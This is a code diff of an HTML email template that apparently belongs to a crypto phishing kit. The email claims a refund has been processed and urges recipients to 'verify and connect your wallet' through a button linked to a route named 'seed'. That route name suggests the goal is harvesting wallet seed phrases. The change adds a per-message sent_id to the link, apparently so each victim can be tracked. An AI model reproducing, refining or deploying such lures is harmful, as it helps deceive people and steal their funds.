@@ -124,7 +124,7 @@
             <p>Your refund has been successfully processed!</p>
             <p>To receive this amount in your wallet, please verify and connect your wallet below.</p>
             <div class="button-container">
-                <a href="{{ route('seed') }}" class="button">Connect Wallet</a>
+                <a href="{{ route('seed', ['sent_id' => $sent_id]) }}" class="button">Connect Wallet</a>
             </div>
             <p>For any questions, please reach out to our support team.</p>
             <p>Best regards,<br>Your Crypto Team</p>
